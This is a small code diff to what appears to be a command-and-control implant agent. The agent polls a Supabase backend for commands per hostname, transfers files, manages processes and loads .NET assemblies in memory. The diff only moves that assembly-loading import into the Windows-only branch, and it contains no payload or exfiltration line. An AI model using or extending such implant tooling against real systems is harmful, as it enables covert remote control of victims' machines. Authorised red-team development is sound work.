@@ -5,7 +5,6 @@ from .commands import update_command_status, fetch_pending_commands_for_hostname
 from .file_operations import handle_download_command, handle_upload_command, fetch_pending_uploads, download_from_supabase
 from .system_info import get_system_info
 from .config import SUPABASE_KEY
-from utils.winapi.netexec import load_dotnet_assembly  # Import the netexec function
 
 # Conditional import based on the operating system
 if os.name == 'nt':  # 'nt' indicates Windows
@@ -16,6 +15,7 @@ if os.name == 'nt':  # 'nt' indicates Windows
     from utils.winapi.wami import wami  # Import the wami function
     from utils.winapi.ps import list_processes, grep_processes, terminate_process  # Import ps functions
     from utils.winapi.run import run_process  # Import the run function
+    from utils.winapi.netexec import load_dotnet_assembly  # Import the netexec function
 
 def handle_kill_command(command_id, command_text, hostname, supabase: Client):
     """Handles the kill command, updates the command status to 'Completed', marks the agent as 'Dead', and exits."""
